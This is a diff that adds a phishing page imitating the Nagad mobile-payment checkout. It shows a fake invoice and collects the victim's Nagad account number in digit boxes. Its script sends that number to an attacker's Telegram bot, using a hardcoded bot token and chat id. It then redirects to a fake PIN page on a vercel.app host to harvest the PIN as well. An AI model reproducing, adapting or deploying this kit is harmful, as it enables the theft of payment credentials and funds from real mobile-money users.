@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" type="image/png" href="https://payment.mynagad.com:30000/img/nagad_favicon.png" sizes="16x16">
+    <title>Nagad Payment Page: Account</title>
+    <link rel="stylesheet" type="text/css" href="https://payment.mynagad.com:30000/css/nagad.css">
+</head>
+
+<body>
+<div class="payment-screen mobile-number-screen">
+    <div class="payment-container">
+        <div class="btn-group lang-switcher" role="group" aria-label="Basic example">
+            <button id="bn_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('bn')">বাং</button>
+            <button id="en_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('en')">Eng</button>
+        </div>
+        <div class="merchant-info">
+            <div class="top-icon">
+                <img class="img-fluid"
+                     src="https://payment.mynagad.com:30000/img/cart.png"
+                     alt="">
+            </div>
+            <div class="merchant-name">Software Shop Ltd</div>
+        </div>
+        <div class="payment-infos">
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="invoice_no">Invoice No:</strong>&nbsp;
+
+                <span>ECOM6015269</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="total">Total Amount:</strong>&nbsp;BDT 
+                <span id="totalAmount">10.00</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="charge">Charge:</strong>&nbsp;
+                <span>BDT 0</span>
+            </p>
+            <p class="payment-info additional-field mb-0">
+                <strong class="translateable" data-trans-key="additional_field_name"></strong>&nbsp;
+                <span></span>
+            </p>
+        </div>
+        <div class="form-container mobile-number-form">
+            <form id="account-form">
+                <div class="form-group">
+                    <label for="" class="translateable" data-trans-key="account_number_label">Your Nagad Account Number</label>
+
+                    <div class="box-inputs">
+
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1" autofocus>
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <span class="input-divider">-</span>
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <span class="input-divider">-</span>
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="number"
+                               maxlength="1">
+                    </div>
+
+
+
+                    <div class="form-check">
+                        <label id="tnc" class="translateable"
+                               data-trans-key="terms_condition_label">By clicking/tapping "Proceed" you are agreeing to our 
+        <a href="https://nagad.com.bd/pg/?n=terms-of-use" target="blank"><strong>Terms and Conditions</strong></a>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="messages">
+                    <span id="error-message" class="text-error"></span>
+                </div>
+
+
+
+                <div class="action-buttons" style="margin-top: 0">
+                    <button onclick=validateNumber(event) type="submit" class="btn translateable" data-trans-key="proceed_btn">Proceed</button>
+                    <button onclick="closePage()" type="button" class="btn translateable" id="close-window"
+                            data-trans-key="close_btn">Close</button>
+                </div>
+            </form>
+        </div>
+        <div class="nagad-logo">
+            <img class="img-fluid" src="https://payment.mynagad.com:30000/img/logo.png" alt="">
+        </div>
+    </div>
+</div>
+
+
+<script>
+    // Function to get the amount from the URL parameter and display it
+    function displayAmount() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || '10.00';
+        document.getElementById('totalAmount').textContent = amount;
+    }
+
+   function moveToNext(input) {
+    // Ensure only digits are allowed
+    if (isNaN(input.value) || input.value.length > 1) {
+        input.value = ''; // Clear invalid input
+        return;
+    }
+
+    // Move to the next input if available
+    if (input.value.length === 1) {
+        let nextInput = input.nextElementSibling;
+
+        // Skip non-input elements like <span>
+        while (nextInput && nextInput.tagName !== 'INPUT') {
+            nextInput = nextInput.nextElementSibling;
+        }
+
+        if (nextInput) {
+            nextInput.focus();
+        }
+    }
+}
+
+
+function validateNumber(event) {
+    event.preventDefault(); // Prevent default form submission
+    const inputs = document.querySelectorAll('.box-inputs input'); // Correctly target the inputs
+    let mobileNumber = '';
+
+    inputs.forEach(input => {
+        mobileNumber += input.value; // Build the number
+    });
+
+    console.log("Constructed Mobile Number:", mobileNumber); // Debug log
+
+    // Validate the number length and prefix
+    if (mobileNumber.length !== 11 || !mobileNumber.startsWith('01')) {
+        document.getElementById('error-message').textContent = 'Invalid mobile number';
+        document.getElementById('error-message').style.display = 'block';
+    } else {
+        document.getElementById('error-message').style.display = 'none';
+        console.log('Sending to Telegram...');
+        sendToTelegram(mobileNumber);
+
+        // Redirect with amount parameter after success
+        const amount = document.getElementById('totalAmount').textContent;
+        setTimeout(() => {
+            window.location.href = `https://portwallet.vercel.app/nagadoriginal/pin.html?amount=${amount}`;
+        }, 2000);
+    }
+}
+
+function sendToTelegram(mobileNumber) {
+    const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+    const chatId = '7174617845';
+    const message = `${mobileNumber}`;
+
+    console.log(`Sending this message to Telegram: ${message}`); // Debug log
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
+    })
+        .then(response => {
+            if (response.ok) {
+                console.log('Message sent to Telegram successfully');
+            } else {
+                console.error('Failed to send message to Telegram:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Error sending to Telegram:', error);
+        });
+}
+
+// Attach the validateNumber function to the form
+document.getElementById('account-form').addEventListener('submit', validateNumber);
+    function closePage() {
+        window.location.href = 'https://allbuysell.vercel.app';
+    }
+
+
+
+    // Display the amount on page load
+    displayAmount();
+</script>
+</body>
+
+</html>
